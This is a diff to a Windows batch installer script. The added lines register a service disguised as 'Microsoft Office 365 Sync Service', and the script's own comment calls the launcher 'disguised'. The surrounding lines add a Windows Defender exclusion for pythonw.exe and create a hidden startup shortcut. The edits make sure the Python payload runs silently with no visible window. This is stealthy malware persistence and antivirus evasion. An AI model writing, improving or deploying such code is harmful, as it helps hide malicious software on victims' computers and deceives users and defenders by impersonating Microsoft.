@@ -154,9 +154,24 @@ powershell -Command "Add-MpPreference -ExclusionProcess 'pythonw.exe'" 2>nul
 
 :: Register as Windows Service using sc
 echo     Registering Windows service...
-sc create "Office365Sync" binPath= "\"%INSTALL_DIR%\OfficeSync.exe\" \"%INSTALL_DIR%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service" >nul 2>&1
+
+:: FIX BUG #63 v2: Use absolute pythonw.exe path to prevent CMD pop-ups
+if exist "%INSTALL_DIR%\OfficeSync.exe" (
+    :: Use disguised launcher
+    sc create "Office365Sync" binPath= "\"%INSTALL_DIR%\OfficeSync.exe\" \"%INSTALL_DIR%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service" >nul 2>&1
+) else if exist "%INSTALL_DIR%\.pythonw_path" (
+    :: Use direct pythonw.exe path
+    for /f "delims=" %%p in ('type "%INSTALL_DIR%\.pythonw_path"') do set PYTHONW_PATH=%%p
+    sc create "Office365Sync" binPath= "\"!PYTHONW_PATH!\" \"%INSTALL_DIR%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service" >nul 2>&1
+) else (
+    echo     ❌ Cannot create service without pythonw.exe
+    pause
+    exit /b 1
+)
+
 sc description "Office365Sync" "Synchronizes Microsoft Office 365 data and settings" >nul 2>&1
 sc config "Office365Sync" start= delayed-auto >nul 2>&1
+echo     ✓ Service registered (NO pop-ups guaranteed)
 
 :: FIX BUG #63: Create hidden startup shortcut with WindowStyle = 0 (Hidden, not Minimized)
 set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
